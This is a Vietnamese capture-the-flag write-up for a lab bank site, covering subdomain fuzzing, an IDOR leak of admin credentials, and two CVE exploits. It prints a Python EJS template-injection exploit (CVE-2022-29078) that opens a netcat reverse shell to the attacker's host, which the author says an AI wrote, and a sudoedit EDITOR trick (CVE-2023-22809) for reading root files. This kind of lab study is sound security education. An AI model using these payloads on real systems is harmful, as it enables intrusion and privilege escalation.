bài này mình sẽ đi tìm tên miền phụ 

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.cyprusbank.thm" -u http://cyprusbank.thm/ -fs 57 -fw 1 -fl 4
```

<img width="2107" height="143" alt="image" src="https://github.com/user-attachments/assets/75551eb7-adcc-4b11-b2bc-2b3ca0595131" />

nó sẽ cho ra 2 kết quả nhưng chỉ có admin mới có thể tương tác, dùng `Olivia Cortez:olivi8` đề bài cho để đăng nhập, do chỉ có quyền khách hàng nên không để xem được số điện thoại của tyrell

<img width="2559" height="977" alt="image" src="https://github.com/user-attachments/assets/83caaab4-13f6-4d3e-bd73-b6e6762efc79" />

ở trang **messages** có 1 lỗ hổng IDOR, khi chuyển số sang 0 thì mình tìm được username:password của tài khoản admin, thế là ta đã tìm được số điện thoại của tyrell

<img width="965" height="69" alt="image" src="https://github.com/user-attachments/assets/47359dd2-8dd3-4da9-a069-c8f334d9bd38" />

để ý rằng web này đang dùng node.js và express trong đó lấy ejs template engine để làm. EJS có một lỗ hổng nghiêm trọng cho phép **Server-Side Template Injection** thông qua parameter `settings[view options][outputFunctionName]` **(CVE-2022-29078)**

<img width="498" height="540" alt="image" src="https://github.com/user-attachments/assets/40e3d064-210b-4bdc-af74-fdd2df9bf68c" />

Trong source code của EJS, khi compile template, giá trị `outputFunctionName` được chèn trực tiếp vào code JavaScript mà **không được sanitize**:

```javascript
// Trong EJS source code:
prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
```

Nếu ta inject payload vào `outputFunctionName`, nó sẽ trở thành code JavaScript hợp lệ:

```javascript
// Bình thường:
var __output = __append;

// Sau khi inject payload "x;require('child_process').execSync('COMMAND');s":
var x;require('child_process').execSync('COMMAND');s = __append;
// ↑ Khai báo var x → Thực thi lệnh → Gán s = __append (vô hại)
```

nên ở đây mình hỏi AI viết cho script này để RCE lên server


```python
import requests

# ===== CẤU HÌNH =====
LHOST = "10.x.x.x"         # IP tun0 của bạn (ip a show tun0)
LPORT = "4444"              # Port listener
COOKIE_VAL = "PASTE_COOKIE_HERE"  # Cookie connect.sid từ browser DevTools
TARGET_URL = "http://admin.cyprusbank.thm/settings"

# ===== PAYLOAD =====
# Reverse shell dùng mkfifo + netcat (ổn định trên Linux)
cmd = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"

# EJS SSTI payload — inject vào outputFunctionName
payload = f"x;process.mainModule.require('child_process').execSync('{cmd}');s"

headers = {
    "Cookie": f"connect.sid={COOKIE_VAL}"
}

# Gửi payload qua POST form data
data = {
    "name": "test",
    "password": "test",
    "settings[view options][outputFunctionName]": payload
}

# ===== THỰC THI =====
print(f"[*] Target:  {TARGET_URL}")
print(f"[*] Shell:   {LHOST}:{LPORT}")
print(f"[*] Payload: EJS SSTI via outputFunctionName")
print(f"[*] Nhớ mở listener: nc -lvnp {LPORT}\n")

try:
    r = requests.post(TARGET_URL, headers=headers, data=data,
                      timeout=5, allow_redirects=False)
    print(f"[-] Status: {r.status_code}")
    if r.status_code == 302:
        print("[!] Cookie hết hạn! Login lại và lấy cookie mới.")
    else:
        # Fallback: thử GET nếu POST không trigger
        print("[*] POST không timeout, thử GET...")
        params = {"settings[view options][outputFunctionName]": payload}
        r = requests.get(TARGET_URL, headers=headers, params=params,
                         timeout=5, allow_redirects=False)
        print(f"[-] GET Status: {r.status_code}")
except requests.exceptions.Timeout:
    print("[+] BINGO! Request timeout → Shell đã lên!")
    print(f"[+] Kiểm tra listener trên port {LPORT}")
except Exception as e:
    print(f"[-] Lỗi: {e}")
```

sau khi mở nc ở cổng 4444, mình đã lên được server và đọc user flag

<img width="975" height="156" alt="image" src="https://github.com/user-attachments/assets/c429e99c-f0b9-4a15-9e89-189af476e15a" />

tiếp theo mình sẽ thử `sudo -l` xem có gì?

<img width="2107" height="522" alt="image" src="https://github.com/user-attachments/assets/1ea785f0-d0f3-48b4-9401-bd80060e8b71" />


`sudoedit` sử dụng biến môi trường `EDITOR` để chọn trình soạn thảo. Khi thực thi, `sudoedit` truyền tên file cho editor. **Lỗ hổng nằm ở chỗ**: `sudoedit` **không filter** ký tự `--` trong biến `EDITOR`, cho phép ta chèn thêm file argument **(CVE-2023-22809)**

sử dụng command này để đọc root file

```bash
export EDITOR="vi -- /root/root.txt"
sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

<img width="676" height="145" alt="image" src="https://github.com/user-attachments/assets/45c229be-ea48-443f-9ebe-dd35f41c6091" />



